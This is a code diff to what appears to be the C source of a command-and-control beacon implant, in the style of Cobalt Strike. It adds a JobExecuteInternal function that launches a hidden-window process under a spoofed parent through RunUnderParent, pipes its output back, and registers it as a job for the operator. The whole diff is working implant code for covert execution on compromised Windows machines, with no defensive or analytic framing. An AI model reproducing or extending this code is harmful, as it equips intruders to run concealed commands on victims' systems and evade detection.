@@ -5,6 +5,7 @@
 #include "beacon.h"
 #include "identity.h"
 #include "pipe.h"
+#include "spawn.h"
 
 
 typedef struct _JOB_ENTRY
@@ -260,9 +261,26 @@ void JobSpawn(char* buffer, int size, BOOL x86, BOOL ignoreToken)
 	BeaconDataFree(locals);
 }
 
-void JobRegisterProcessWithOemOutput(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite)
+void JobExecuteInternal(char* buffer, int length)
 {
-	PROCESS_INFORMATION lPi = { pi->hProcess, NULL, pi->dwProcessId, NULL };
-	JOB_ENTRY* job = JobRegisterProcess(&lPi, hRead, hWrite, "process");
-	job->callbackType = CALLBACK_OUTPUT_OEM;
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+
+	HANDLE hRead, hWrite;
+	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
+	GetStartupInfoA(&si);
+	si.hStdInput = NULL;
+	si.hStdOutput = hWrite;
+	si.hStdError = hWrite;
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	if(RunUnderParent(buffer, length, &si, &pi, CREATE_NEW_CONSOLE, FALSE))
+	{
+		WaitForSingleObject(pi.hProcess, 10000);
+		PROCESS_INFORMATION lPi = { pi.hProcess, NULL, pi.dwProcessId, 0 };
+		JOB_ENTRY* job = JobRegisterProcess(&lPi, hRead, hWrite, "process");
+		job->callbackType = CALLBACK_OUTPUT_OEM;
+	}
 }
